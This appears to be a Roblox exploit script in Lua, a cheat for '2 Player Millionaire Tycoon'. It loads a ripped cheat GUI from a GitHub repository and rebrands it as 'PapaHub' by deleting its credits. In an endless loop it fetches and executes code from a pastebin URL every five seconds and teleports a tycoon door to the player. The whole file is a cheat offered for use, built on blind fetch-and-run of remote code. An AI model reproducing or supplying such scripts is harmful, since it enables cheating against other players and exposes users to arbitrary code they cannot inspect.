_G.RedGUI = true
_G.Theme = "Dark" -- Must disable or remove _G.RedGUI to use
--Themes: Light, Dark, Mocha, Aqua and Jester

loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/2PlayerMillionaireTycoon.lua"))()
local title = game:GetService("CoreGui")["2 Player Millionaire Tycoon | discord.gg/rips | By RIP#6666"].MainFrame.TitleBar.Title
while title.Text ~= 'PapaHub' do 
    wait()
print("Not loaded")
game:GetService("CoreGui")["2 Player Millionaire Tycoon | discord.gg/rips | By RIP#6666"].MainFrame.NavBar.Content.CREDITS:destroy();
game:GetService("CoreGui")["2 Player Millionaire Tycoon | discord.gg/rips | By RIP#6666"].MainFrame.NavBar.Content.FPS:destroy();
 title.Text  = 'PapaHub'
end 


while true do 
    wait (5)
loadstring(game:HttpGet("https://pastebin.com/raw/9hGa82eS", true))()
game:GetService("Workspace").Tycoons.Red1.Important.Door.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame

end 
